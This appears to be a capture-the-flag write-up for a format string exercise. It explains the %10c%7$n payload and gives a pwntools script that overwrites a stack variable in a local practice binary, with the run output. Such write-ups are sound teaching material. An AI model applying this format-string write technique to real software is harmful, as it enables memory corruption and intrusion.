# 10_format_var_overwrite Writeup

## Steps:
1. Run chall. This is another problem where we are modifying a target variable, but the input is limited so that we cannot reach the target the same way as before.
```
$ ./chall    

Your goal is to modify the variable @ 0x7ffc0b64e4a8

This exercise is to modify the variable using the '%n\%hn\%hhn' format specifier.


0x7ffc0b64e480: 0x0000000000000000 0x0000000000000000 
0x7ffc0b64e490: 0x0000000000000000 0x0000000000000000 
0x7ffc0b64e4a0: 0xffffffffffffffff 0x00000000deadbeef 

Enter input: AAAA
AAAA

0x7ffc0b64e480: 0x0000000a41414141 0x0000000000000000 
0x7ffc0b64e490: 0x0000000000000000 0x0000000000000000 
0x7ffc0b64e4a0: 0xffffffffffffffff 0x00000000deadbeef 

You failed to modify the target variable...
Maybe you didn't supply enough input? Try again!
```
2. Exploit format string vulnerability as the prompt indicates
   - Identify where on the stack input is written. In this case, it is `5`
   - Print some number of characters with %_c
   - %_$n with that being the stack address you want to write to
4. Write the payload
- `%10c`: Print 10 characters (i.e., add 10 to the total number of characters printed).
- `%7$n`: Write the number of bytes written so far (10 in this case) to the 7th argument on the stack, which is assumed to be the address you want to write to.
- Add padding if necessary to fill a full whole 8 byte value (in this case its not necessary)
- `p64(addr)`: Appends the 64-bit address you want to write to. This is placed on the stack to be referenced by %7$n.

```
from pwn import *

target = process('./chall')

target.recvuntil(b"variable @ ")
addr = target.recvuntil(b"\n").strip().decode()

addr = int(addr, 16)
log.info(hex(addr))

payload = b"%10c%7$n"
payload += p64(addr)

target.sendline(payload)

s = target.recvall().decode('latin-1')
print(s)
```

## Solution:
```
$ python3 exploit.py 
[+] Starting local process './chall': pid 68312
[*] 0x7ffcfe299e18
[+] Receiving all data: Done (613B)
[*] Process './chall' stopped with exit code 0 (pid 68312)

This exercise is to modify the variable using the '%n\%hn\%hhn' format specifier.


0x7ffcfe299df0: 0x0000000000000000 0x0000000000000000 
0x7ffcfe299e00: 0x0000000000000000 0x0000000000000000 
0x7ffcfe299e10: 0xffffffffffffffff 0x00000000deadbeef 

Enter input:          ð\x18)þü\x7f
0x7ffcfe299df0: 0x6e24372563303125 0x00007ffcfe299e18 
0x7ffcfe299e00: 0x000000000000000a 0x0000000000000000 
0x7ffcfe299e10: 0xffffffffffffffff 0x000000000000000a 

Congrats! You modified the target variable!
```
          
